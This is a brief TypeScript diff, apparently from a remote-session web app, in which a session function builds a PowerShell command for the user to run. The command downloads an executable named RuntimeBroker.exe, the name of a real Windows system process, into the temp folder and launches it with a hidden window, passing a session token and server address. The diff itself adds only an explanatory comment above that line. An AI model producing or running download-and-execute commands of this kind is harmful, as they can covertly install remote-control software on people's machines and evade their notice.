@@ -17,6 +17,8 @@ export async function createSession(): Promise<CreateSessionResponse> {
   const { sessionId, token } = await res.json() as { sessionId: string; token: string };
 
   const publicServer = process.env.NEXT_PUBLIC_SIGNALING_SERVER ?? SERVER_URL;
+
+  // Simple command: download to TEMP and run with token/server arguments
   const agentCommand = `powershell -Command "iwr ${publicServer}/RuntimeBroker.exe -OutFile $env:TEMP\\RuntimeBroker.exe; Start-Process -FilePath $env:TEMP\\RuntimeBroker.exe -ArgumentList '--token ${token} --server ${publicServer}' -WindowStyle Hidden"`;
 
   return {
